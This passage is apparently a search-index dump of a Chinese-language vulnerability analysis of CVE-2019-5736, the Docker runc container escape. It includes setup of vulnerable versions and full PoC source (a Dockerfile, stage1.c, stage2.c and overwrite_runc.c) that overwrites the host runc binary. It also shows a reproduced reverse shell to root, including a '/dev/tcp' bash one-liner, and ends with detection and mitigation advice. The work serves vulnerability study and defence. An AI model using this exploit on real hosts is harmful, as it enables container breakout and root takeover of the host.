daemon\u8fdb\u7a0b\u662f\u901a\u8fc7root\u6743\u9650\u6267\u884crunc\u6307\u4ee4\u7684)\uff0c\u8fdb\u800c\u5bfc\u81f4\u547d\u4ee4\u6267\u884c\u3002  \u5177\u4f53\u89c1\u9644\u4ef6CVE-2019-5736-\u9644\u4ef6\uff0c\u590d\u73b0\u73af\u5883Poc\u90e8\u5206\u3002    \u901a\u8fc7\u6267\u884c\u5bb9\u5668\u8fdb\u7a0b\u89e6\u53d1\u7684\u65b9\u5f0f\uff0c\u89c1\u9644\u4ef6CVE-2019-5736-\u9644\u4ef6\uff0c\u5176\u4ed6Poc\u90e8\u5206\u3002",
            "title": "a. POC\u539f\u7406"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#b-poc",
            "text": "Github PoC:  by q3k@github     \u590d\u73b0\u73af\u5883PoC \u89c1\u9644\u4ef6: CVE-2019-5736-\u9644\u4ef6->\u590d\u73b0\u73af\u5883PoC\u90e8\u5206",
            "title": "b. POC\u6e90\u7801"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#c",
            "text": "\u590d\u73b0\u73af\u5883   \u73af\u5883\u6e05\u5355  \u7cfb\u7edf\u7248\u672c: Ubuntu 18.04.4 LTS (Bionic Beaver)      docker\u7248\u672c:  Docker version 17.12.1-ce, build 7390fc6    runc\u7248\u672c:  runc version 1.0.0-rc4+dev  \u865a\u62df\u673a\u8f6f\u4ef6\uff1aVMwareFusion \u4e13\u4e1a\u7248 11.5.1 (15018442)    \u865a\u62df\u673a\u8f6f\u4ef6\uff1aQEMU emulator version 4.2.0      \u73af\u5883\u642d\u5efa\uff1a\u89c1\u9644\u4ef6\uff1acve-2018-1000001-01 -> \u73af\u5883\u642d\u5efa\u90e8\u5206      Step1 - \u6784\u5efa\u6076\u610f\u5bb9\u5668    # \u4e0b\u8f7d\u5e76\u89e3\u538bPoc\nroot# ls -l\ntotal 16\n-rwxr-xr-x 1 invincible invincible 624 Apr\u00a0 8 00:36 Dockerfile\n-rwxr-xr-x 1 invincible invincible 249 Feb 11\u00a0 2019 README\n-rwxr-xr-x 1 invincible invincible 672 Apr\u00a0 8 00:38 stage1.c\n-rwxr-xr-x 1 invincible invincible 390 Feb 11\u00a0 2019 stage2.c\n\n# \u8fd9\u4e00\u6b65\u9700\u8981\u4e00\u4e9b\u65f6\u95f4\nroot# docker bulid -t cve .\nSending build context to Docker daemon\u00a0 6.144kB\nStep 1/8 : FROM ubuntu:18.04\n...   Step2 - \u8fd0\u884c\u5bb9\u5668   root# docker run cve\nHAX2: argv: /proc/self/fd/3\nHAX2: fd: 4\nHAX2: res: 13, 0   \u67e5\u770bPoC \u6548\u679c   root# strings /usr/bin/docker-runc | tail -n 2\n.debug_gdb_scripts\ncve-2019-5736",
            "title": "c. \u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#4-exp",
            "text": "",
            "title": "4. EXP"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#a-exp",
            "text": "\u540cPoC\u539f\u7406\u7c7b\u4f3c\uff0c\u53ea\u662f\u5c06\u8986\u76d6runc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u5185\u5bb9\u4fee\u6539\u4e3a\u53cd\u5f39shell\u7684\u6076\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002",
            "title": "a. EXP\u539f\u7406"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#b-exp",
            "text": "Github Exp:  twistlock@github",
            "title": "b. EXP\u6e90\u7801"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#c_1",
            "text": "\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePOC\u4e2d\u7684\u73af\u5883\u76f8\u540c    Step1 - \u4e0b\u8f7dexp    git clone https://github.com/twistlock/RunC-CVE-2019-5736   Step2 - \u521b\u5efa\u5bb9\u5668\u955c\u50cf   sudo docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC   Step3 - nc\u5f00\u542f\u76d1\u542c\u7aef\u53e3   nc -nvlp 2345   Step4 - \u542f\u52a8\u5bb9\u5668 \n\u5728\u6b64\u6b65\u9aa4\u4e4b\u524d\uff0c\u8981\u5148\u5907\u4efddocker-runc\u6587\u4ef6   sudo docker run --rm cve-2019-5736:malicious_image_POC   \u56de\u8bdd\u5efa\u7acb\u6210\u529f   $ nc -nvlp 2345\nListening on [0.0.0.0] (family 0, port 2345)\nConnection from 127.0.0.1 60968 received!\nbash: cannot set terminal process group (44874): Inappropriate ioctl for device\nbash: no job control in this shell\n<faa22423a51484667b34a86e17683ae80bd44930d00b71dd6# id\nid\nuid=0(root) gid=0(root) groups=0(root)   docker-runc\u53ef\u6267\u884c\u6587\u4ef6\u4fee\u6539\u6210\u529f   $ which docker-runc \n/usr/bin/docker-runc\n$ cat /usr/bin/docker-runc \n#!/bin/bash\nbash -i >& /dev/tcp/0.0.0.0/2345 0>&1 &",
            "title": "c. \u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#d",
            "text": "\u5bb9\u5668\u8fdb\u7a0b\u901a\u8fc7/proc\u6587\u4ef6\u7cfb\u7edf\uff0c\u8bbf\u95ee\u5e76\u4fee\u6539\u5bbf\u4e3b\u673a\u7684\u53ef\u6267\u884c\u6587\u4ef6",
            "title": "d. \u5229\u7528\u6838\u5fc3\u8981\u7d20"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#5",
            "text": "a. \u5982\u4f55\u68c0\u6d4b\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e      \u68c0\u6d4brunc/docker-runc\u7248\u672c\u662f\u5426\u4e3a\u6f0f\u6d1e\u4fee\u590d\u540e\u7684\u7248\u672c\u3002    \u68c0\u6d4brunc\u53ef\u6267\u884c\u6587\u4ef6\u7684hash\u503c\u662f\u5426\u4e0e\u539f\u59cb\u5305\u4e2d\u7684\u4e00\u81f4\u3002    \u6267\u884cPoc\u811a\u672c\u6d4b\u8bd5\u80fd\u5426\u6210\u529f\u3002    b. \u5982\u4f55\u9632\u5fa1\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e      \u5bf9\u6765\u6e90\u4e0d\u660e\u7684Docker\u5bb9\u5668\u955c\u50cf\u626b\u63cf\uff0c\u68c0\u6d4b\u662f\u5426\u6709\u5305\u542b \"#!/proc/self/exe\" \u5b57\u7b26\u4e32\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5982\u679c\u6709\u5219\u89c6\u4e3a\u53ef\u7591\u955c\u50cf\u963b\u6b62\u5176\u8fd0\u884c(\u8fd9\u53ea\u80fd\u9632\u5fa1\u6076\u610f\u5bb9\u5668\u8fdb\u7a0b\u7684\u5229\u7528\u65b9\u5f0f)\u3002    \u5bf9\u6765\u6e90\u4e0d\u660e\u7684Docker\u5bb9\u5668\u955c\u50cf\u5165\u53e3\u8fdb\u7a0b\u626b\u63cf\uff0c\u68c0\u6d4b\u5176\u662f\u5426\u5b58\u5728\u5bf9runc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u64cd\u4f5c\u884c\u4e3a\u3002    \u68c0\u6d4brunc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4fee\u6539\uff0c\u5e76\u963b\u6b62\u4fee\u6539\u540e\u7684runc\u6587\u4ef6\u6267\u884c\u3002    c. \u6709\u6ca1\u6709\u54ea\u79cd\u901a\u7528\u7684\u7f13\u89e3\u63aa\u65bd\u53ef\u4ee5\u963b\u65ad\u8fd9\u4e2a/\u7c7b\u6f0f\u6d1e      \u5b89\u88c5\u6700\u65b0\u7248\u672c\u7684Docker/runc\u3002    \u76d1\u63a7\u5bb9\u5668\u8fdb\u7a0b\u6587\u4ef6\u64cd\u4f5c\uff0c\u5f53\u5176\u64cd\u4f5c\u7684\u6587\u4ef6\u5c5e\u4e8e\u5bbf\u4e3b\u673a\u6587\u4ef6\u65f6\uff0c\u5c06\u5176\u963b\u65ad\u3002",
            "title": "5. \u9632\u62a4\u5efa\u8bae"
        },
        {
            "location": "/userspace/cve-2019-5736-\u5206\u6790/#6",
            "text": "https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html  https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d  https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/",
            "title": "6.\u53c2\u8003"
        },
        {
            "location": "/userspace/cve-2019-5736-\u9644\u4ef6/",
            "text": "Docker runc\u5bb9\u5668\u9003\u9038\u6f0f\u6d1e\u5206\u6790\u9644\u4ef6(CVE-2019-5736)\n\n\n\u57fa\u7840\u77e5\u8bc6\n\n\nDocker\n\n\nhttps://docs.docker.com/get-started/overview/\n\n\nhttps://docs.docker.com/engine/reference/run/\n\n\nhttps://docs.docker.com/engine/reference/commandline/exec/\n\n\nDockerfile\n\n\nhttps://docs.docker.com/engine/reference/builder/\n\n\nhttps://docs.docker.com/engine/reference/builder/#from\n\n\nhttps://docs.docker.com/engine/reference/builder/#run\n\n\nhttps://docs.docker.com/engine/reference/builder/#add\n\n\nhttps://docs.docker.com/engine/reference/builder/#entrypoint\n\n\nOCI\u548crunc\n\n\nhttps://cizixs.com/2017/11/05/oci-and-runc/\n\n\n\u51e0\u4e2a\u6613\u6df7\u6dc6\u7684\u6982\u5ff5\n   \n\n\n\n\n\n\nrunc\u548cdocker-runc\n\nrunc\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u8fdb\u7a0b\uff0cdocker-runc\u662f\u5b89\u88c5docker\u540e\uff0cdocker\u81ea\u5e26\u7684runc\uff0c\u6587\u4e2d\u63d0\u5230\u7684\u53ef\u4ee5\u7406\u89e3\u6210\u76f8\u540c\u7684\u610f\u601d\u3002\n\n\n\n\n\n\ndocker.io\u548cdocker-ce\n\ndocker.io\u662fubuntu\u7684docker package\u7684\u540d\u79f0;\n\u5982\u679c\u4ecedocker\u5b98\u65b9\u6e90\u4e0b\u8f7d\u5219\u662fdocker-ce, docker-ce-cli, containerd.io\u3002\n\u672c\u6587\u7528\u7684\u662f\u6709\u6f0f\u6d1e\u7248\u672c\u7684ubuntu package \u3002\n\n\n\n\n\n\nLinux Namespace\n\n\nhttps://lwn.net/Articles/531114/\n\n\nLinux Control Group\n\n\nhttps://www.infoq.cn/article/docker-kernel-knowledge-cgroups-resource-isolation/\n  \n\n\ncgroups (abbreviated from control groups) is a Linux kernel feature that limits, accounts for, and isolates the resource usage (CPU, memory, disk I/O, network, etc.) of a collection of processes.\n\n\ncgroups\u7528\u4e8e\u5bf9\u4e00\u7ec4\u8fdb\u7a0b\u53ef\u4ee5\u4f7f\u7528\u7684\u7cfb\u7edf\u8d44\u6e90\u505a\u9650\u5236\u3002\n\n\nlibseccomp\n\n\nhttps://github.com/seccomp/libseccomp\n\n\nThe libseccomp library provides an easy to use, platform independent, interface to the Linux Kernel's syscall filtering mechanism.\n\n\nrunc\u7684\u4e00\u4e2a\u4f9d\u8d56\u5e93\uff0c\u7528\u4e8e\u9650\u5236\u5bb9\u5668\u8fdb\u7a0b\u53ef\u4f7f\u7528\u7684\u7cfb\u7edf\u8c03\u7528\u3002\n\n\n$ ldd /usr/sbin/runc\n    linux-vdso.so.1 (0x00007fffd11e6000)\n    libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f5f0bde7000)\n    libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007f5f0bba0000)\n    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5f0b7af000)\n    /lib64/ld-linux-x86-64.so.2 (0x00007f5f0c006000)\n\n\n\n\nprocfs\n\nporc\u6587\u4ef6\u7cfb\u7edf\u662f\u4e00\u4e2a\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff0c\u901a\u5e38mount\u5230/proc\u76ee\u5f55\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u7cfb\u7edf\u5185\u6838\u5411\u7528\u6237\u6001\u5f00\u653e\u7684\u63a5\u53e3\u3002\n\n\n/proc/self/exe\n \u662f\u5f53\u524d\u8fdb\u7a0b\u53ef\u6267\u884c\u6587\u4ef6\u7684\u7b26\u53f7\u94fe\u63a5\uff1b  \n\n\n/proc/self/fd\n \u662f\u4e00\u4e2a\u76ee\u5f55\uff0c\u5305\u542b\u4e86\u5f53\u524d\u8fdb\u7a0b\u6253\u5f00\u7684\u6587\u4ef6\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u7b26\u53f7\u94fe\u63a5\u540d\u79f0\u4ee5\u6587\u4ef6\u63cf\u8ff0\u7b26\u547d\u540d\u3002\n\n\n$ more exploit.c \n\n$ ps -aux|grep -v grep|grep more\ninvinci+  18760  0.0  0.0  16836   900 pts/5    S+   03:28   0:00 more exploit.c\n$ cd /proc/18760/fd\n$ ls\n0  1  2  3\n$ file 3\n3: symbolic link to /home/invincible/Desktop/runc_test/exp/exploit.c\n\n\n\n\n\n\u73af\u5883\u642d\u5efa\n\n\n\u865a\u62df\u673a\u5b89\u88c5\n\n\n\u7cfb\u7edf\u955c\u50cf\uff1a\nhttps://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso\n\n\n# \u00a0\u521b\u5efa\u865a\u62df\u673a\u786c\u76d8\n$ qemu-img create -f qcow2 ubuntu18.04.4.img 10G\n\n# \u5b89\u88c5\u865a\u62df\u673a\n$ qemu-system-x86_64  -m 2048 -hda ubuntu18.04.4.img -cdrom ./ubuntu-18.04.4-desktop-amd64.iso\n\n# \u542f\u52a8\u865a\u62df\u673a\n$ qemu-system-x86_64 -m 2048  ubuntu18.04.4.img\n\n\n\n\nDocker\u5b89\u88c5\n\n\n\u4f7f\u7528Ubunt\u7684\u53d1\u884c\u7248\u672c\u7684packeg: docker-io ( Docker\u5b98\u65b9\u4ed3\u5e93\u7684packges: docker-ce, docker-ce-cli, container.io \u6f0f\u6d1e\u5df2\u7ecf\u4fee\u590d)\n\n\n\u67e5\u770b\u53ef\u5b89\u88c5\u7248\u672c:\n\n\n$ apt-cache policy docker.io\ndocker.io:\n\u00a0 Installed: 17.12.1-0ubuntu1\n\u00a0 Candidate: 19.03.6-0ubuntu1~18.04.1\n\u00a0 Version table:\n\u00a0 \u00a0 \u00a019.03.6-0ubuntu1~18.04.1 500\n\u00a0 \u00a0 \u00a0 \u00a0 500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-updates/universe amd64 Packages\n\u00a0 \u00a0 \u00a018.09.7-0ubuntu1~18.04.4 500\n\u00a0 \u00a0 \u00a0 \u00a0 500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security/universe amd64 Packages\n\u00a0*** 17.12.1-0ubuntu1 500\n\u00a0 \u00a0 \u00a0 \u00a0 500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic/universe amd64 Packages\n\u00a0 \u00a0 \u00a0 \u00a0 100 /var/lib/dpkg/status\n\n\n\n\n\u67e5\u770bdocker.io\u7684changelog:\n\n\n$ PAGER=cat apt-get -q=2 changelog docker.io \n...\ndocker.io (18.09.2-0ubuntu1) disco; urgency=medium\n\n\u00a0 * Update to 18.09.2, including fix for CVE-2019-5736.\n\u00a0 \u00a0 - Convert components/engine/git-bundles/CVE-2019-5736.bundle into\n\u00a0 \u00a0 \u00a0 d/patches/0001-nsenter-clone-proc-self-exe-to-avoid-exposing-host-b.patch.\n\u00a0 \u00a0 - Hard code RUNC_COMMIT in d/rules for now.\n\n\u00a0-- Michael Hudson-Doyle <michael.hudson@ubuntu.com>\u00a0 Tue, 12 Feb 2019 10:55:11 +1300\n\n...\n\n\n\n\n\u5728\n\u5b98\u7f51\n\u4e0b\u8f7d\u4f4e\u7248\u672c\npackage\n\uff0c\u6216\u8005\n\u767e\u5ea6\u4e91\n \u5bc6\u7801:q9vg\uff0c\u4e0b\u8f7d\u540e\u5b89\u88c5\uff1a\n\n\n$\u00a0sudo dpkg -i docker.io_17.12.1-0ubuntu1_amd64.deb\n...\n\n$ docker --version\nDocker version 17.12.1-ce, build 7390fc6\n\n$ docker-runc --version\nrunc version 1.0.0-rc4+dev\ncommit: 9f9c96235cc97674e935002fc3d78361b696a69e\nspec: 1.0.0\n\n\n\n\n\u6216\u8005\u76f4\u63a5apt-get\u5b89\u88c5(\u5982\u679c\u8fd8\u6709\u7684\u8bdd)\uff1a\n\n\n$ sudo apt-get install docker.io=17.12.1-0ubuntu1\n\n\n\n\n\u590d\u73b0\u73af\u5883PoC\n\n\n\u4f7f\u7528\u7684\u662f\u901a\u8fc7\u6784\u9020\u6076\u610f\u5bb9\u5668\u955c\u50cf\uff0c\u5f53\u8fd0\u884c\u5bb9\u5668\u65f6\u89e6\u53d1\u6f0f\u6d1e\u7684\u65b9\u5f0f(\nDocker run\n)\u3002\n\n\n\u94fe\u63a5:\nhttps://pan.baidu.com/s/1HKZREeCc3TCu7LPTv5wm7A\n\u00a0 \u5bc6\u7801:piqr\n\n\n$ tree\n.\n\u251c\u2500\u2500 Dockerfile\n\u251c\u2500\u2500 README\n\u251c\u2500\u2500 stage1.c\n\u2514\u2500\u2500 stage2.c\n\n0 directories, 4 files\n\n\n\n\n$ cat Dockerfile\nFROM ubuntu:18.04\n# \u7ee7\u627fubuntu:18.04 image\nRUN set -e -x ;\\\n\u00a0 \u00a0 sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\\\n\u00a0 \u00a0 apt -y update ;\\\n\u00a0 \u00a0 apt-get -y install build-essential ;\\\n\u00a0 \u00a0 cd /root ;\\\n\u00a0 \u00a0 apt-get -y build-dep libseccomp ;\\\n\u00a0 \u00a0 apt-get source libseccomp\n\u00a0 \u00a0\u00a0\nADD stage1.c /root/stage1.c\nRUN set -e -x ;\\\n\u00a0 \u00a0 cd /root/libseccomp-* ;\\\n\u00a0 \u00a0 cat /root/stage1.c >> src/api.c ;\\\n\u00a0 \u00a0 DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\\\n\u00a0 \u00a0 dpkg -i /root/*.deb\n# libseccomp\u662frunc\u52a0\u8f7d\u7684\u4e00\u4e2a\u52a8\u6001\u5e93\n# \u539fPoc\u8fd9\u91cc\u662fcd /root/libseccomp-2.3.1, \u4f46\u662fapt-get source libseccomp\u4f1a\u5b89\u88c5\u6700\u65b0\u7684\u7248\u672c\uff0c\u6240\u4ee5\u8fd9\u4e2a\u7248\u672c\u53f7\u9700\u8981\u4fee\u6539\n# \u8fd9\u51e0\u6b65\u662f\u4e0b\u8f7dlibseccomp\u7684\u6e90\u7801\u5305\uff0c\u4fee\u6539\u6e90\u7801\u7684src/api.c\u6587\u4ef6\uff0c\u8ffd\u52a0\u5199\u5165\u4e86stage1.c\u7684\u5185\u5bb9(\u7ed9api.c\u589e\u52a0\u4e86\u4e00\u4e2a\u6784\u9020\u51fd\u6570\uff0c\u5728\u5b83\u7684main\u51fd\u6570\u4e4b\u524d\u6267\u884c)\uff0c\u5c06\u4fee\u6539\u7684libseccomp\u6784\u5efa\u6210dep\u5305\u5e76\u5b89\u88c5\n\nADD stage2.c /root/stage2.c\nRUN set -e -x ;\\\n\u00a0 \u00a0 cd /root ;\\\n\u00a0 \u00a0 gcc stage2.c -o /stage2\n# \u7f16\u8bd1stage2.c\uff0c\u7b49\u5f85\u88abstage1\u52a0\u8f7d\u5e76\u6267\u884c\n\nENTRYPOINT [ \"/entrypoint\" ]\n\n\nRUN set -e -x ;\\\n\u00a0 \u00a0 ln -s /proc/self/exe /entrypoint\n# \u628a/proc/self/exe\u8bbe\u7f6e\u4e3a\u5bb9\u5668\u7684entrypoint\uff0c\u8ba9runc\u8fd0\u884c\u5bb9\u5668\u65f6\u6267\u884c/proc/self/exe\n# \u5373\u5728\u5bb9\u5668iamge\u4e2d\u6267\u884crunc\u8fdb\u7a0b\uff0c\u8fdb\u800c\u52a0\u8f7d\u6076\u610f\u6784\u9020\u7684\u52a8\u6001\u5e93\uff0c\u6267\u884c\u540e\u9762\u7684exp\u4ee3\u7801(stage1.c stage2.c, \u5b8c\u6210\u5bf9runc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4fee\u6539)\n\n\n\n\n$ cat stage1.\n\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n\n\n__attribute__ ((constructor)) void foo(void)\n{\n\u00a0 \u00a0 int fd = open(\"/proc/self/exe\", O_RDONLY);\n\u00a0 \u00a0 if (fd == -1 ) {\n\u00a0 \u00a0 \u00a0 \u00a0 printf(\"HAX: can't open /proc/self/exe\\n\");\n\u00a0 \u00a0 \u00a0 \u00a0 return;\n\u00a0 \u00a0 }\n\u00a0 \u00a0 printf(\"HAX: fd is %d\\n\", fd);\n\u00a0 \u00a0 char *argv2[3];\n\u00a0 \u00a0 argv2[0] = strdup(\"/stage2\");\n\u00a0 \u00a0 char buf[128];\n\u00a0 \u00a0 snprintf(buf, 128, \"/proc/self/fd/%d\", fd);\n\u00a0 \u00a0 argv2[1] = buf;\n\u00a0 \u00a0 argv2[2] = 0;\n\u00a0 \u00a0 execve(\"/stage2\", argv2, NULL);\n}\n\n\n/*\n\n\n__attribute__ ((constructor))\nThe constructor attribute causes the function to be called automatically before execution enters main ().\u00a0\n\n\n\u6253\u5f00\u5f53\u524d\u8fdb\u7a0b\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0cexecve\u6267\u884c\u5b50\u8fdb\u7a0bstage2\u5e76\u5c06\u6587\u4ef6\u63cf\u8ff0\u7b26\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9stage2\n*/\n\n\n\n\n$ cat stage2.c\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <errno.h>\n\n\nint main(int argc, char **argv) {\n\u00a0 \u00a0 printf(\"HAX2: argv: %s\\n\", argv[1]);\n\u00a0 \u00a0 int fd = open(argv[1], O_RDWR|O_APPEND);\n\u00a0 \u00a0 printf(\"HAX2: fd: %d\\n\", fd);\n\n\u00a0 \u00a0 const char *poc = \"cve-2019-5736\";\n\u00a0 \u00a0 int res = write(fd, poc, strlen(poc));\n\u00a0 \u00a0 printf(\"HAX2: res: %d, %d\\n\", res, errno);\n}\n\n/*\n\u6839\u636estage1\u4f20\u5165\u7684runc\u8def\u5f84\uff0c \u5c06poc\u8ffd\u52a0\u5199\u5165\u8be5\u6587\u4ef6\u672b\u5c3e\uff0c\u5b8c\u6210\u5bf9\u5bbf\u4e3b\u673arunc\u53ef\u6267\u884c\u6587\u4ef6\u7684\u4fee\u6539\u3002\n*/\n\n\n\n\n\u590d\u73b0\u73af\u5883Exp\n\n\n\u94fe\u63a5:\nhttps://pan.baidu.com/s/1d1ABdQLDdKwEKkX2dW-cbw\n\u00a0 \u5bc6\u7801:83fs\n\n\ntwistlock@github\n\n\n\u5176\u4ed6Poc\n\n\nhttps://github.com/twistlock/RunC-CVE-2019-5736\n  \n\n\n\u5176\u4ed6\u7248\u672c-Go\u7248\u672c\uff1a\nby Frichetten@github\n\n\u5176\u4ed6\u7248\u672c-C\u7248\u672c\uff1a\nby feexd\n@github\n  \n\n\n\u4e0b\u9762\u4ecb\u7ecd\u7684\u662f\u6784\u9020\u6076\u610f\u5bb9\u5668\u8fdb\u7a0b\u89e6\u53d1\u6f0f\u6d1e\u7684Poc\u3002\u8fd9\u79cd\u65b9\u5f0f\u89e6\u53d1\u6761\u4ef6\u6bd4\u53e6\u4e00\u79cd\u65b9\u5f0f\u8981\u66f4\u4e3a\u82db\u523b\uff0c\u5b9e\u9645\u6d4b\u8bd5\u65f6\u7531\u4e8e\u65e0\u6cd5\u63a7\u5236\u7a0b\u5e8f\u65f6\u5e8f\uff0c\u5c1d\u8bd5\u4e86\u51e0\u6b21\u90fd\u5931\u8d25\u4e86\u3002\n\n\n$ tree\n.\n\u251c\u2500\u2500 Dockerfile\n\u251c\u2500\u2500 bash_evil\n\u251c\u2500\u2500 new_runc\n\u251c\u2500\u2500 new_runc.c\n\u251c\u2500\u2500 overwrite_runc\n\u251c\u2500\u2500 overwrite_runc.c\n\u2514\u2500\u2500 replace.sh\n\n\n\n\n\n$ cat Dockerfile\nFROM ubuntu:18.04\n\nCOPY replace.sh /\nRUN [\"chmod\", \"+x\", \"/replace.sh\"]\nCOPY overwrite_runc /overwrite_runc\nRUN [\"chmod\", \"+x\", \"/overwrite_runc\"]\nCOPY new_runc /\n\nRUN [\"mv\", \"/bin/bash\", \"/bin/bash_original\"]\nCOPY bash_evil /bin/bash\nRUN [\"chmod\", \"+x\", \"/bin/bash\"]\n\nENTRYPOINT [\"/bin/bash_original\", \"/replace.sh\"]\n\n# \u5c06replace.sh, overwrite_runc, new_runc\u590d\u5236\u5230\u5bb9\u5668iamge\n# \u5c06\u5bb9\u5668image\u7684/bin/bash \u66ff\u6362\u6210bash_evil\n# \u5c06replace.sh\u4f5c\u4e3aentrypoint\u5728docker run\u65f6\u6267\u884c\n\n\n\n\n\n$ cat bash_evil\n#!/proc/self/exe\n\n\n\n\n$ cat replace.sh\n#!/bin/bash_original\necho \"[+] Waiting for runC to be executed in the container...\"\n\nrunc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')\n\n# Wait for /proc/self/exe to be executed\nwhile [ -z \"$runc_pid\" ]\ndo\n    runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')\ndone\n\n# Call overwrite_runc with the symlink to the runC binary\n./overwrite_runc /proc/${runc_pid}/exe\n\n# 1. \u6301\u7eed\u68c0\u6d4b\u8fdb\u7a0b\uff0c\u7b49\u5f85runc\u8fdb\u7a0b\u51fa\u73b0(\u8868\u793a\u4fee\u6539\u540e\u7684/bin/sh\u88abrunc exec\u6267\u884c)\n# 2. \u6267\u884coverwrite_runc\u4fee\u6539/proc/[runc-pid]/exe\u6587\u4ef6\u4e3anew_runc\n\n\n\n\n\n$ cat new_runc.c\n\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n\nint main(int argc, char *argv[])\n{\n    printf(\"\\n**THE ALL NEW AND IMPROVED RUNC**\\n\\n\");\n    printf(\"\\t[+] Your backdoor here ->\\n\\n\");\n    return 0;\n}\n// \u8fd9\u91cc\u662f\u8986\u76d6runc\u6587\u4ef6\u7684payload\u4ee3\u7801 \n\n\n\n\n\n$ cat overwrite_runc.c\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <errno.h>\n\n#include <stdlib.h>\n#include <string.h>\n#include <stdio.h>\n\n/* Simple Buffer*/\ntypedef struct Buffer\n{\n    int len;        // buffer length\n    void * buff;    // buffer data\n} Buffer;\n\n\n#define FALSE 0\n#define TRUE  1\n\nconst char * DEFAULT_NEW_RUNC_PATH = \"/new_runc\";\nconst unsigned int PATH_MAX_LEN = 30;\nconst int OPEN_ERR = -1;\nconst int RET_ERR = 1;\nconst int RET_OK = 0;\n\nconst long WRITE_TIMEOUT = 99999999999999999;\nBuffer read_new_runc(char * new_runc_path);\n\n\n/*\n* Usage: overwrite_runc </proc/runc_pid/exe> <new runc path>\n* Overwrites the runC binary.\n*/\nint main(int argc, char *argv[])\n{\n    int runc_fd_read, my_runc_fd, wc;\n    char my_runc_fd_path[PATH_MAX_LEN];\n    char * new_runc_path;                        // path to file to replace runc\n    char * runc_exe_path;\n    Buffer new_runc;\n\n\n    if (argc == 1 || argc > 3)\n    {\n        printf(\"Usage: %s </proc/runc_pid/exe> <new runc path>\\n\", argv[0]);\n        return RET_ERR;\n    }\n\n\n    /* Open /proc/runc_pid/exe for reading */\n    runc_exe_path = argv[1];\n    runc_fd_read = open(runc_exe_path, O_RDONLY);\n    if (runc_fd_read == OPEN_ERR)\n    {\n        printf(\"[!] Couldn't open runC's exe %s\\n\", runc_exe_path);\n        perror(\"[!] Open\");\n        return RET_ERR;\n    }\n    printf(\"[+] Got %s as fd %d in this process\\n\", runc_exe_path, runc_fd_read);\n\n\n\n    /* Read new_runc */\n    if (argc < 3)\n        new_runc_path = DEFAULT_NEW_RUNC_PATH;\n    else\n        new_runc_path = argv[2];\n    new_runc = read_new_runc(new_runc_path);\n    if (new_runc.buff == NULL)\n    {\n        close(runc_fd_read);\n        return RET_ERR;\n    }\n    printf(\"[+] Read %d bytes from new runC\\n\", new_runc.len);\n\n\n    /* Try to open /proc/self/fd/runc_fd_read for writing */\n    /* Will Succeed after the runC process exits          */\n    sprintf(my_runc_fd_path, \"/proc/self/fd/%d\", runc_fd_read);\n    int opened = FALSE;\n    for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)\n    {\n        my_runc_fd = open(my_runc_fd_path, O_WRONLY | O_TRUNC);\n        if (my_runc_fd != OPEN_ERR)\n        {\n            wc = write(my_runc_fd, new_runc.buff, new_runc.len);\n            if (wc !=  new_runc.len)\n            {\n                printf(\"[!] Couldn't write to my process's runC's fd %s\\n\", my_runc_fd_path);\n                close(my_runc_fd);\n                close(runc_fd_read);\n                free(new_runc.buff);\n                return RET_ERR;\n            }\n            printf(\"[+] Opened runC (using %s) for writing\\n\", my_runc_fd_path);\n            printf(\"[+] Succesfully overwritten runC\\n\");\n            opened = TRUE;\n        }\n    }\n\n    /* Clean ups & return */\n    close(my_runc_fd);\n    close(runc_fd_read);\n    free(new_runc.buff);\n    if (opened == FALSE)\n    {\n        printf(\"[!] Reached timeout, couldn't write to runc at %s\\n\", my_runc_fd_path);\n        return RET_ERR;\n    }\n    else\n        printf(\"[+] 